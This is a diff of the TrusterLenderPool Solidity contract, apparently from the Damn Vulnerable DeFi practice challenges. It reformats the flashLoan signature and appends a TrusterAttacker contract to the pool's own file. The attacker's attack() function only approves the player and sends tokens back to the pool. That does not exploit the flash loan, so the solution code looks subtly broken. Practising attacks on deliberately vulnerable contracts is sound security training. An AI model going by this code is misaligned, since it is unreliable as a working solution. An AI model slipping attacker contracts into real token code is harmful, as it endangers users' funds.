@@ -17,11 +17,12 @@ contract TrusterLenderPool is ReentrancyGuard {
         token = _token;
     }
 
-    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
-        external
-        nonReentrant
-        returns (bool)
-    {
+    function flashLoan(
+        uint256 amount,
+        address borrower,
+        address target,
+        bytes calldata data
+    ) external nonReentrant returns (bool) {
         uint256 balanceBefore = token.balanceOf(address(this));
 
         token.transfer(borrower, amount);
@@ -32,5 +33,20 @@ contract TrusterLenderPool is ReentrancyGuard {
         }
 
         return true;
+    }
+}
+
+contract TrusterAttacker {
+    TrusterLenderPool public immutable pool;
+    DamnValuableToken public immutable token;
+    address public immutable player;
+    constructor(address _pool, address _player) {
+        pool = TrusterLenderPool(_pool);
+        token = pool.token();
+        player = _player;
+    }
+    function attack(uint256 amount) external {
+        token.approve(player, amount);
+        token.transfer(address(pool), amount);
     }
 }
